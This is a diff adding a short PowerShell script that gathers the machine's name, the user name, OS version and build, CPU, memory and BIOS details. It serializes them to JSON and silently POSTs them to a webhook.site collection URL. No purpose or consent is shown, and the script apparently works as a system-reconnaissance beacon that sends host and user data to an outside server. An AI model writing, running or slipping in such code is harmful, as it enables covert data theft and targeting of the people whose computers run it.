@@ -1,0 +1,20 @@
+
+
+$sysInfo = @{
+    "ComputerName" = $env:COMPUTERNAME
+    "UserName" = $env:USERNAME
+    "OperatingSystem" = (Get-WmiObject -Class Win32_OperatingSystem).Caption
+    "OSVersion" = (Get-WmiObject -Class Win32_OperatingSystem).Version
+    "OSBuildNumber" = (Get-WmiObject -Class Win32_OperatingSystem).BuildNumber
+    "SystemType" = (Get-WmiObject -Class Win32_ComputerSystem).SystemType
+    "TotalPhysicalMemory (MB)" = [math]::Round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1MB, 2)
+    "Processor" = (Get-WmiObject -Class Win32_Processor).Name
+    "BIOSVersion" = (Get-WmiObject -Class Win32_BIOS).SMBIOSBIOSVersion
+}
+
+$jsonData = $sysInfo | ConvertTo-Json -Depth 3
+
+$url = "https://webhook.site/91df8830-246b-47e1-854f-349d2cf870da"
+
+Invoke-RestMethod -Uri $url -Method Post -Body $jsonData -ContentType "application/json"
+
